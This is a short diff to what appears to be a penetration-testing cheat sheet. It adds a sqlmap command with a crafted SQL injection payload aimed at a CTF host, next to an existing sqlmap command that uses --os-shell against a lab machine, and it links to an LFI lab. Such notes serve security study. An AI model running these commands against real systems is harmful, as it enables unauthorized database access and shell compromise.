@@ -777,6 +777,10 @@ For getting a shell
 
     sqlmap -u "http://10.0.2.7/admin/edit.php?id=1" --cookie=PHPSESSID=<id> --os-shell
 
+Parameter
+
+    sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+"
+
 **Local File Inclusion (LFI)**
 
 https://www.vulnhub.com/entry/pentester-lab-php-include-and-post-exploitation,79/ 
